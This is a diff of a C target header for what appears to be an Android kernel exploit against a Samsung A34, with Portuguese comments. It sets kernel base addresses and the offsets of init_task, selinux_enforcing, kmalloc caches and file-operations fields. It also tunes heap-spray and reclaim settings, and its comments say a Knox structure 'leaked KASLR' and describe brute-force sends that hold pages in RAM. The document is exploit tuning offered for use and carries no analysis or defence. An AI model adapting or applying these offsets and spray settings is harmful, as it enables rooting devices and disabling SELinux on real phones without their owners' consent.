@@ -21,18 +21,20 @@
 
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
-#define P0_PHYS_OFFSET 0x40000000ULL
-#define P0_KERNEL_PHYS_LOAD 0x40000000ULL
-#define SKB_DATA_DELTA (-0xd80LL)
+#define P0_PHYS_OFFSET 0x40000000ULL           /* Mantido o padrão do hardware do A34 */
+#define P0_KERNEL_PHYS_LOAD 0x40000000ULL       /* Mantido o padrão do hardware do A34 */
+#define SKB_DATA_DELTA (-0xd80LL)               /* Mantido o delta calibrado do seu A34 */
 
-/* --- CONFIGURAÇÕES GLOBAIS FORÇADAS DE MITIGAÇÃO DO ANDROID 16 --- */
-#define MM_STRUCT_SZ 0x500
-#define MM_ORDER 4
+/* --- CONFIGURAÇÕES DE VOLUME ADAPTADAS DO A55 PARA O HARDENING DO RECLAIM --- */
+#define MM_STRUCT_SZ 0x500                      /* Expansão estável do Knox que vazou o KASLR */
+#define MM_ORDER 4                              /* Ordem de alinhamento condizente com a struct 0x500 */
 #define PSELECT_ENTER_DELAY_USEC 24000
-#define SLIDE_STACK_WRITER_FUTEX 1
-#define RECLAIM_MODE_ADVANCED 1
-#define SLIDE_KSNITCH_APPENDED_FUTEXES 4096
-#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 128
+#define APP_SLIDE_RECLAIM_SENDS 192             /* Força bruta do A55: 192 disparos contínuos */
+#define APP_SLIDE_RECLAIM_SNDBUF 16777216       /* Buffer maciço de 16MB para segurar as páginas na RAM */
+#define APP_MM_LATE_DRAIN_TRIGGERS 2
+#define APP_DEFER_FINAL_DRAIN_REAP 1
+#define APP_DEFER_ALL_DRAIN_REAPS 1
+#define APP_QUIET_RECLAIM_WINDOW 1
 
 #define KMALLOC_CGROUP_TYPE 0
 #define KMALLOC_CACHE_TYPES 2
@@ -98,9 +100,7 @@
 #define COPY_SPLICE_READ_OFF 0x005369ccULL
 #define NOOP_LLSEEK_OFF 0x004c2234ULL
 
-/* Alterado para o cálculo do A34: (0xffffffc08236e340 - 0xffffffc008000000) */
 #define INIT_TASK_OFF 0x01fce340ULL
-
 #define ROOT_TASK_GROUP_OFF 0x027a8040ULL
 #define SELINUX_ENFORCING_OFF 0x028d9770ULL
 #define KMALLOC_CACHES_OFF 0x020e6580ULL
@@ -220,4 +220,5 @@
 #define FOPS_SPLICE_READ_OFF 0xc8
 #define FOPS_SHOW_FDINFO_OFF 0xe0
 
-#endif
+#endif /* TARGET_H */
+
